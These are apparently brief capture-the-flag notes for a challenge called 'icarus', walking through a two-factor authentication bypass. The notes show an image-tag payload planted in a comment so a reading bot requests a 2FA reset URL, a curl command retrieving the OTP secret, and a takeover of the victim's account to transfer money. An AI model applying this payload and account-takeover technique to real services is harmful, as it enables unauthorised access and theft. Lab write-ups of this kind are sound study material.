https://aswingovind.medium.com/2-factor-authentication-bypass-3b2bbd907718



icarus - 1ea8b3ac0640e44c27b3cb8a258a87f8


1. login and verify a user
2. send a transaction to icarus with a 'posonus' image in the comment box --> the bot which reads over the comments is icarus' user
	1. `![](http://127.0.0.1/reset-2fa/?otp.jpg)`
3. `curl -vv 'http://127.0.0.1:1337/reset-2fa/?otp.jpg' -H 'Host: 127.0.0.1'`
4. use found qr-otpkey-code _H5CDCLQLFYQQOKSI_ to generate a new password in google authenticator
5. login as icarus and transfer the money
6. and pwned:
![[Screenshot 2022-05-19 at 07.51.00.png]]
